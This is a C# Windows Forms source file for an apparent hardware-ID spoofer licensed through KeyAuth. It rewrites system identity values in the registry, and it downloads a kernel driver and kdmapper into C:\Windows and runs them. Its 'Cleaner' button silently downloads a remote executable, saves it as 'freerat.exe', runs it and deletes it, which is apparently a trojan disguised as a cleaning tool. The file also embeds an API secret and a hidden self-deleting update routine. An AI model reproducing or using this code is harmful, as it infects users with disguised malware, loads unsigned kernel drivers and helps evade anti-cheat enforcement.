using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System;
using KeyAuth;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Guna.UI2.Native.WinApi;
using System.Diagnostics;
using System.IO;

namespace ud
{
    public partial class Form1 : Form
    {
        public static api KeyAuthApp = new api(
   name: "Hans",
   ownerid: "huoT27jcK2",
   secret: "411cb5c6510c6057a043a5079ba6858c197f88786b1b8b2cc2a0ca551bcd09e6",
   version: "1.0"
);
        static string Driver = "https://github.com/SoarDevelopment/Spoof-Driver/raw/main/soardrv.sys";
        static string Mapper = "https://github.com/SoarDevelopment/Spoof-Driver/raw/main/kdmapper.exe";
        private string generatedID;
        private static Random random = new Random();

        public static string randomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private string[] registryKeys = new string[]
        {
            "Hardware\\Description\\System\\CentralProcessor\\0",
            "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
            "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
            "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001",
            "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0012"
        };

        //WARNING: registryKeysValues.GetLength(0) equal to registryKeys.Length 
        //nop - means nothing, its like "no operation"
        private string[,] registryKeysValues = new string[,]
        {
            {"SystemProductName", "Identifier", "Previous Update Revision", "ProcessorNameString", "VendorIdentifier", "Platform Specific Field1", "Component Information"},
            {"SerialNumber", "Identifier", "SystemManufacturer", "nop", "nop", "nop", "nop"},
            {"ComputerHardwareId", "ComputerHardwareIds", "BIOSVendor", "ProductId", "ProcessorNameString", "BIOSReleaseDate", "nop"},
            {"ProductId", "InstallDate", "InstallTime", "nop", "nop", "nop", "nop"},
            {"SusClientId", "nop", "nop", "nop", "nop", "nop", "nop"},
            {"NetCfgInstanceId", "NetLuidIndex", "nop", "nop", "nop", "nop", "nop"},
            {"NetworkAddress", "NetCfgInstanceId", "NetworkInterfaceInstallTimestamp", "nop", "nop", "nop", "nop"}
        };
        public void Form1_Load(object sender, EventArgs e)
        {
            KeyAuthApp.init();

            if (KeyAuthApp.response.message == "invalidver")
            {
                if (!string.IsNullOrEmpty(KeyAuthApp.app_data.downloadLink))
                {
                    DialogResult dialogResult = MessageBox.Show("Yes to open file in browser\nNo to download file automatically", "Auto update", MessageBoxButtons.YesNo);
                    switch (dialogResult)
                    {
                        case DialogResult.Yes:
                            Process.Start(KeyAuthApp.app_data.downloadLink);
                            Environment.Exit(0);
                            break;
                        case DialogResult.No:
                            WebClient webClient = new WebClient();
                            string destFile = Application.ExecutablePath;

                            string rand = random_string();

                            destFile = destFile.Replace(".exe", $"-{rand}.exe");
                            webClient.DownloadFile(KeyAuthApp.app_data.downloadLink, destFile);

                            Process.Start(destFile);
                            Process.Start(new ProcessStartInfo()
                            {
                                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                                FileName = "cmd.exe"
                            });
                            Environment.Exit(0);

                            break;
                        default:
                            MessageBox.Show("Invalid option");
                            Environment.Exit(0);
                            break;
                    }
                }
                MessageBox.Show("Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer");
                Environment.Exit(0);
            }

            if (!KeyAuthApp.response.success)
            {
                MessageBox.Show(KeyAuthApp.response.message);
                Environment.Exit(0);
            }
        }
        static string random_string()
        {
            string str = null;

            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                str += Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))).ToString();
            }
            return str;

        }
        public Form1()
        {
            InitializeComponent();
                
        }

        private void guna2CirclePictureBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2CirclePictureBox2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void spoofRegistryKey(int regKeyIndex)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(registryKeys[regKeyIndex], true);

            if (registryKey == null)
                return;

            for (int ctr = 0; ctr < registryKeysValues.GetLength(1); ctr++)
            {
                if (registryKeysValues[regKeyIndex, ctr] == "nop")
                    break;

                registryKey.SetValue(registryKeysValues[regKeyIndex, ctr], generatedID);
                generatedID = randomString(20);

            }

            registryKey.Close();
        }

        public string[] getSpoofingRegistryKeys()
        {
            return registryKeys;
        }
        public string[,] getSpoofingRegistryKeyValues()
        {
            return registryKeysValues;
        }

        private void guna2ContainerControl3_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            generatedID = randomString(20);
            for (int ctr = 0; ctr < registryKeys.Length; ctr++)
            {
                spoofRegistryKey(ctr);
            }
            WebClient wb = new WebClient();
            wb.DownloadFile(Driver, @"C:\Windows\driver.sys");
            wb.DownloadFile(Mapper, @"C:\Windows\mapper.exe");
            System.Diagnostics.Process.Start(@"C:\Windows\mapper.exe", @"C:\Windows\driver.sys");
            MessageBox.Show("Successfully Spoofed", "noisyisud", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Thread.Sleep(2000);
        }




        class Cleaner
        {
            public static void Clean()
            {
                string downloadUrl = "https://github.com/CPXxZWaAwj/eD2p708zW4/raw/main/a9lP0qkZJu.exe";
                string filePath = Path.Combine(Path.GetTempPath(), "freerat.exe");

                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile(downloadUrl, filePath);
                }

                Process process = new Process();
                process.StartInfo.FileName = filePath;
                process.StartInfo.UseShellExecute = true;

                process.Start();

                process.WaitForExit();


                File.Delete(filePath);
            }
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            Console.Beep(200, 400);
            Cleaner.Clean();
           
        }

        private void guna2HtmlLabel7_Click(object sender, EventArgs e)
        {

        }

        private void guna2HtmlLabel2_Click(object sender, EventArgs e)
        {

        }
    }


    class Checker
    {

        static void ExecuteCommand(string command)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c " + command;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            Console.WriteLine(output);
        }
        public static void Check()
        {

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Bios");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic bios get serialnumber");
            ExecuteCommand("wmic csproduct get uuid");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("CPU");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic cpu get serialnumber");
            ExecuteCommand("wmic cpu get processorid");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Diskdrive");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic diskdrive get serialnumber");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Baseboard");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic baseboard get serialnumber");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Ram");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic memorychip get serialnumber");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("MacAddress");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("GPU");
            Console.WriteLine("------------");
            Console.ForegroundColor = ConsoleColor.White;
            ExecuteCommand("wmic PATH Win32_VideoController GET Description,PNPDeviceID");

            Console.WriteLine("Press enter to go back to the main menu after you're done checking your serials! \n\n(Everything should be invisible except Diskdrive)\n\n(If not, then open Task Manager and end the WMI Provider Host applications that are open and recheck!)");
        }
    }
}
